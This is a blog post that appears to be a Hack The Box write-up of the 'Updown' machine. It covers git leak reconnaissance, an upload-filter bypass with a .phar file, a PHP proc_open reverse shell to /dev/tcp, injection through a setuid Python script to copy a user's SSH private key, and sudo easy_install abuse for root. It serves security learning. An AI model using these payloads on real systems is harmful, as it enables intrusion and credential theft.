<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Updown -Hack The Box - Blog</title><meta name="Description" content=""><meta property="og:title" content="Updown -Hack The Box" />
<meta property="og:description" content="Summary Starting with a leaky local git directory from the siteisup.htb server, which led to accessing another subdomain. It has a development feature where we can upload files. From there, we can bypass the upload restriction with the phar file and upload a PHP reverse shell with the php proc_open function. after gaining a foothold In the user&rsquo;s home directory, we discovered a custom setuid binary that allowed us to gain more privileged access to the server." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://akhils911dev.github.io/theblog/updown/" /><meta property="og:image" content="https://akhils911dev.github.io/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-12-29T23:12:25+05:30" />
<meta property="article:modified_time" content="2022-12-29T23:12:25+05:30" /><meta property="og:site_name" content="blog by a security researcher" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://akhils911dev.github.io/logo.png"/>

<meta name="twitter:title" content="Updown -Hack The Box"/>
<meta name="twitter:description" content="Summary Starting with a leaky local git directory from the siteisup.htb server, which led to accessing another subdomain. It has a development feature where we can upload files. From there, we can bypass the upload restriction with the phar file and upload a PHP reverse shell with the php proc_open function. after gaining a foothold In the user&rsquo;s home directory, we discovered a custom setuid binary that allowed us to gain more privileged access to the server."/>
<meta name="application-name" content="Blog">
<meta name="apple-mobile-web-app-title" content="Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="https://akhils911dev.github.io/theblog/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="https://akhils911dev.github.io/theblog/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="https://akhils911dev.github.io/theblog/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="https://akhils911dev.github.io/theblog/apple-touch-icon.png"><link rel="mask-icon" href="https://akhils911dev.github.io/theblog/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="https://akhils911dev.github.io/theblog/site.webmanifest"><link rel="canonical" href="https://akhils911dev.github.io/theblog/updown/" /><link rel="next" href="https://akhils911dev.github.io/theblog/health/" /><link rel="stylesheet" href="https://akhils911dev.github.io/theblog/lib/normalize/normalize.min.css"><link rel="stylesheet" href="https://akhils911dev.github.io/theblog/css/style.min.css"><link rel="stylesheet" href="https://akhils911dev.github.io/theblog/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="https://akhils911dev.github.io/theblog/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Updown -Hack The Box",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/akhils911dev.github.io\/theblog\/updown\/"
        },"genre": "posts","wordcount":  1114 ,
        "url": "https:\/\/akhils911dev.github.io\/theblog\/updown\/","datePublished": "2022-12-29T23:12:25+05:30","dateModified": "2022-12-29T23:12:25+05:30","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "Akhil"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="https://akhils911dev.github.io/theblog/" title="Blog">Home</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="https://akhils911dev.github.io/theblog/posts/"> Posts </a><a class="menu-item" href="https://akhils911dev.github.io/theblog/tags/"> Tags </a><a class="menu-item" href="https://akhils911dev.github.io/theblog/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="https://akhils911dev.github.io/theblog/" title="Blog">Home</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="https://akhils911dev.github.io/theblog/posts/" title="">Posts</a><a class="menu-item" href="https://akhils911dev.github.io/theblog/tags/" title="">Tags</a><a class="menu-item" href="https://akhils911dev.github.io/theblog/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Updown -Hack The Box</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://akhils911dev.github.io/theblog/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Akhil</a>
</span>&nbsp;<span class="post-category">included in <a href="https://akhils911dev.github.io/theblog/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackThebox</a>&nbsp;<a href="https://akhils911dev.github.io/theblog/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CTF</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-12-29">2022-12-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1114 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="https://akhils911dev.github.io/theblog/svg/loading.min.svg"
        data-src="https://akhils911dev.github.io/theblog/img/updown.png"
        data-srcset="https://akhils911dev.github.io/theblog/img/updown.png, https://akhils911dev.github.io/theblog/img/updown.png 1.5x, https://akhils911dev.github.io/theblog/img/updown.png 2x"
        data-sizes="auto"
        alt="/img/updown.png"
        title="/img/updown.png" /></div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#summary">Summary</a></li>
    <li><a href="#recon">Recon</a>
      <ul>
        <li><a href="#nmap">Nmap</a></li>
        <li><a href="#git">Git</a></li>
        <li><a href="#developers-site">Developers site</a></li>
      </ul>
    </li>
    <li><a href="#foothold">Foothold</a>
      <ul>
        <li><a href="#shell-as-www-data">Shell as www-data</a></li>
        <li><a href="#www-data-to-developer">www-data to developer</a></li>
      </ul>
    </li>
    <li><a href="#ssh-as-developer">SSH as developer</a></li>
    <li><a href="#privilege-escalation">Privilege escalation</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="summary">Summary</h2>
<p>Starting with a leaky local git directory from the siteisup.htb server, which led to accessing another subdomain. It has a development feature where we can upload files. From there, we can bypass the upload restriction with the phar file and upload a PHP reverse shell with the php proc_open function. after gaining a foothold In the user&rsquo;s home directory, we discovered a custom setuid binary that allowed us to gain more privileged access to the server. Take the ssh shell and abuse the sudo command to escalate privileges.</p>
<h2 id="recon">Recon</h2>
<h3 id="nmap">Nmap</h3>
<p>Starting wtih nmap port scan</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
</code></pre></td></tr></table>
</div>
</div><p>We can see two usual ports are open also i did a full port scan their is nothing much intertesting.</p>
<p>Connecting to port 80</p>
<p><img
        class="lazyload"
        src="https://akhils911dev.github.io/theblog/svg/loading.min.svg"
        data-src="https://akhils911dev.github.io/theblog/img/updown-web.png"
        data-srcset="https://akhils911dev.github.io/theblog/img/updown-web.png, https://akhils911dev.github.io/theblog/img/updown-web.png 1.5x, https://akhils911dev.github.io/theblog/img/updown-web.png 2x"
        data-sizes="auto"
        alt="/img/updown-web.png"
        title="image" />
We can see from the above picture it is a site that checks to see if a website is up or down also it reveal the hostname siteisup.htb</p>
<p>Run a feroxbuster scan to fuzz the hidden diretory&rsquo;s we can found /dev and it&rsquo;s sub diretory /.git.</p>
<h3 id="git">Git</h3>
<p>wget recursively downloaded the directory to our local machine.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Git branch -a
Git log main
commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y &lt;84577967+ab2pentest@users.noreply.github.com&gt;
Date:   Wed Oct <span class="m">20</span> 16:38:54 <span class="m">2021</span> +0200

    New technique in header to protect our dev vhost.

git show 8812785e31c879261050e72e20f298ae8c43b565
commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y &lt;84577967+ab2pentest@users.noreply.github.com&gt;
Date:   Wed Oct <span class="m">20</span> 16:38:54 <span class="m">2021</span> +0200

    New technique in header to protect our dev vhost.

diff --git a/.htaccess b/.htaccess
index 44ff240..b317ab5 <span class="m">100644</span>
--- a/.htaccess
+++ b/.htaccess
@@ -2,3 +2,4 @@ SetEnvIfNoCase Special-Dev <span class="s2">&#34;only4dev&#34;</span> Required-Header
 Order Deny,Allow
 Deny from All
 Allow from <span class="nv">env</span><span class="o">=</span>Required-Header
</code></pre></td></tr></table>
</div>
</div><p>Exploring the local git directory, which has only one branch, main, we checked every entry in the change log for main and found an interesting commit message.&ldquo;new technique in headers to protect our development vhost&rdquo; Using the git show command, we can see the changes in this commit. It has another juicy piece of information to access the domain: a custom header, &ldquo;Special-Dev: only4dev.&ldquo;From all of these details, we can understand that siteisup.htb has a vhost named &ldquo;dev&rdquo; and that it only has access via the custom header. We can also fuzz the subdoamin using ffuf to reveal the subdoamin.</p>
<h3 id="developers-site">Developers site</h3>
<p>Adding dev.siteisup.htb to host file and the help of burpsuite match and replace option to add the coustom header we can opened the dev site.
<img
        class="lazyload"
        src="https://akhils911dev.github.io/theblog/svg/loading.min.svg"
        data-src="https://akhils911dev.github.io/theblog/img/updown-dev.png"
        data-srcset="https://akhils911dev.github.io/theblog/img/updown-dev.png, https://akhils911dev.github.io/theblog/img/updown-dev.png 1.5x, https://akhils911dev.github.io/theblog/img/updown-dev.png 2x"
        data-sizes="auto"
        alt="/img/updown-dev.png"
        title="image" /></p>
<p>It seems that we can upload files to check if the website is up or down. To test the upload functions, I created a txt file with my tun0 interface IP. When we upload the file, it goes to the /uploads directory and is named with the MD5 hash. It was also removed after it was checked.</p>
<p>Upload directory
<img
        class="lazyload"
        src="https://akhils911dev.github.io/theblog/svg/loading.min.svg"
        data-src="https://akhils911dev.github.io/theblog/img/updown-hash.png"
        data-srcset="https://akhils911dev.github.io/theblog/img/updown-hash.png, https://akhils911dev.github.io/theblog/img/updown-hash.png 1.5x, https://akhils911dev.github.io/theblog/img/updown-hash.png 2x"
        data-sizes="auto"
        alt="/img/updown-hash.png"
        title="image" /></p>
<p>Our uploaded file
<img
        class="lazyload"
        src="https://akhils911dev.github.io/theblog/svg/loading.min.svg"
        data-src="https://akhils911dev.github.io/theblog/img/updown-ourfile.png"
        data-srcset="https://akhils911dev.github.io/theblog/img/updown-ourfile.png, https://akhils911dev.github.io/theblog/img/updown-ourfile.png 1.5x, https://akhils911dev.github.io/theblog/img/updown-ourfile.png 2x"
        data-sizes="auto"
        alt="/img/updown-ourfile.png"
        title="image" /></p>
<p>Also, I tried to upload a php file, but it was failed due to some fillers. We got the response, &ldquo;Extension not allowed!&rdquo;</p>
<h2 id="foothold">Foothold</h2>
<p>what we can do is we need to bypass the fillers and upload a php file to gain code execution.I tried some other extensions like phtml, php5-7, phar and Phar I got worked up. To see what functions are available, I uploaded the phar file and used the phpinfo function. Unfortunately, normal system functions are disabled expect &ldquo;proc_open&rdquo;.</p>
<p>Created a revershell with proc_open</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">),</span>
  <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">),</span>
  <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;file&#34;</span><span class="p">,</span> <span class="s2">&#34;/tmp/error-output.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span>
<span class="p">);</span>
<span class="nv">$process</span> <span class="o">=</span> <span class="nx">proc_open</span><span class="p">(</span><span class="s2">&#34;cat&#34;</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>

  <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s1">&#39;echo &#34;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 &#34; &gt; /tmp/shell.sh | chmod 777 /tmp/shell.sh | sh /tmp/shell.sh&#39;</span><span class="p">);</span>
   <span class="cm">/* fwrite writes to stdin, &#39;cat&#39; will immediately write the data from stdin
</span><span class="cm">   * to stdout and blocks, when the stdout buffer is full. Then it will not
</span><span class="cm">   * continue reading from stdin and php will block here.
</span><span class="cm">   */</span>
  <span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
  <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
      <span class="nv">$out</span> <span class="o">.=</span> <span class="nx">fgets</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">1024</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
  <span class="nv">$return_value</span> <span class="o">=</span> <span class="nx">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></td></tr></table>
</div>
</div><p>Referance <a href="http://www.navioo.com/php/docfunction.proc-open.php" target="_blank" rel="noopener noreffer">http://www.navioo.com/php/docs/function.proc-open.php</a>
</p>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<p>Upload the phar file and got the shell.</p>
<p><img
        class="lazyload"
        src="https://akhils911dev.github.io/theblog/svg/loading.min.svg"
        data-src="https://akhils911dev.github.io/theblog/img/updown-shell.png"
        data-srcset="https://akhils911dev.github.io/theblog/img/updown-shell.png, https://akhils911dev.github.io/theblog/img/updown-shell.png 1.5x, https://akhils911dev.github.io/theblog/img/updown-shell.png 2x"
        data-sizes="auto"
        alt="/img/updown-shell.png"
        title="image" /></p>
<p>Also i created python script to automated these foothold step.<br>
here is the github link <a href="https://gist.github.com/akhils911dev/b85ee0c853bb91625f81665a6e753e84" target="_blank" rel="noopener noreffer">https://gist.github.com/akhils911dev/b85ee0c853bb91625f81665a6e753e84</a>
</p>
<h3 id="www-data-to-developer">www-data to developer</h3>
<p>we found a coustom setuid binary from /dev directory of user developer home. which belongs with to a python script called siteisup_script.py.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"> ls -la
total <span class="m">32</span>
drwxr-x--- <span class="m">2</span> developer www-data   <span class="m">4096</span> Jun <span class="m">22</span>  <span class="m">2022</span> .
drwxr-xr-x <span class="m">6</span> developer developer  <span class="m">4096</span> Aug <span class="m">30</span> 11:24 ..
-rwsr-x--- <span class="m">1</span> developer www-data  <span class="m">16928</span> Jun <span class="m">22</span>  <span class="m">2022</span> siteisup
-rwxr-x--- <span class="m">1</span> developer www-data    <span class="m">154</span> Jun <span class="m">22</span>  <span class="m">2022</span> siteisup_test.py
</code></pre></td></tr></table>
</div>
</div><p>siteisup.py</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@updown:/home/developer/dev$ cat siteisup_test.py 
import requests

<span class="nv">url</span> <span class="o">=</span> input<span class="o">(</span><span class="s2">&#34;Enter URL here:&#34;</span><span class="o">)</span>
<span class="nv">page</span> <span class="o">=</span> requests.get<span class="o">(</span>url<span class="o">)</span>
<span class="k">if</span> page.status_code <span class="o">==</span> 200:
        print <span class="s2">&#34;Website is up&#34;</span>
<span class="k">else</span>:
        print <span class="s2">&#34;Website is down&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>By examining the Python script, we can see that it uses our input as an url to determine whether the site is up or down. abusing this to inject Python system code to take the id_rsa of the developer.</p>
<p>Payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="nb">__import__</span><span class="p">(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;cat /home/developer/.ssh/id_rsa &gt; /tmp/key&#34;</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>Executing the setuid binary with our payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@updown:/home/developer/dev$ ./siteisup
Welcome to <span class="s1">&#39;siteisup.htb&#39;</span> application

Enter URL here:__import__<span class="o">(</span><span class="s2">&#34;os&#34;</span><span class="o">)</span>.system<span class="o">(</span><span class="s2">&#34;cat /home/developer/.ssh/id_rsa &gt; /tmp/key&#34;</span><span class="o">)</span>

www-data@updown:/home/developer/dev$ head /tmp/key 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw/
S1qi9PFoNvzkt7Uy3++6xDd95ugAdtuRL7qzA03xSNkqnt2HgjKAPOr6ctIvMDph8JeBF2
F9Sy4XrtfCP76+WpzmxT7utvGD0N1AY3+EGRpOb7q59X0pcPRnIUnxu2sN+vIXjfGvqiAY
ozOB5DeX8rb2bkii6S3Q1tM1VUDoW7cCRbnBMglm2FXEJU9lEv9Py2D4BavFvoUqtT8aCo
srrKvTpAQkPrvfioShtIpo95Gfyx6Bj2MKJ6QuhiJK+O2zYm0z2ujjCXuM3V4Jb0I1Ud+q
a+QtxTsNQVpcIuct06xTfVXeEtPThaLI5KkXElx+TgwR0633jwRpfx1eVgLCxxYk5CapHu
u0nhUpICU1FXr6tV2uE1LIb5TJrCIx479Elbc1MPrGCksQVV8EesI7kk5A2SrnNMxLe2ck
IsQHQHxIcivCCIzB4R9FbOKdSKyZTHeZzjPwnU+FAAAFiHnDXHF5w1xxAAAAB3NzaC1yc2
www-data@updown:/home/developer/dev$
</code></pre></td></tr></table>
</div>
</div><p>We can now see our code is successfully executed and it copy the developers id_rsa to /tmp</p>
<h2 id="ssh-as-developer">SSH as developer</h2>
<p>Copy the key to our local machine and connected through ssh</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">developer@updown:~$ id <span class="o">&amp;&amp;</span> whoami
<span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>developer<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>developer<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>developer<span class="o">)</span>
developer
developer@updown:~$ ls
dev  user.txt
developer@updown:~$ 
</code></pre></td></tr></table>
</div>
</div><h2 id="privilege-escalation">Privilege escalation</h2>
<p>It is the most easiast part of this machine. Just check to see what we can run as sudo. We can run easy_install as root.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">developer@updown:~$ sudo -l
Matching Defaults entries <span class="k">for</span> developer on localhost:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User developer may run the following commands on localhost:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/easy_install
</code></pre></td></tr></table>
</div>
</div><p>With the help of <a href="https://gtfobins.github.io/gtfobins/easy_install/#sudo" target="_blank" rel="noopener noreffer">GTFobins</a>
 we can abuse this binary to get the root access.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">developer@updown:~$ sudo /usr/local/bin/easy_install ^C
developer@updown:~$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span>
developer@updown:~$ <span class="nb">echo</span> <span class="s2">&#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;</span><span class="k">$(</span>tty<span class="k">)</span><span class="s2"> &gt;</span><span class="k">$(</span>tty<span class="k">)</span><span class="s2"> 2&gt;</span><span class="k">$(</span>tty<span class="k">)</span><span class="s2">&#39;)&#34;</span> &gt; <span class="nv">$TF</span>/setup.py
developer@updown:~$ sudo /usr/local/bin/easy_install <span class="nv">$TF</span>
WARNING: The easy_install <span class="nb">command</span> is deprecated and will be removed in a future version.
Processing tmp.zMbAjkFXvF
Writing /tmp/tmp.zMbAjkFXvF/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.zMbAjkFXvF/egg-dist-tmp-AIs2rL
<span class="c1"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><p>Now we rooted.</p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2022-12-29</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="https://akhils911dev.github.io/theblog/updown/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
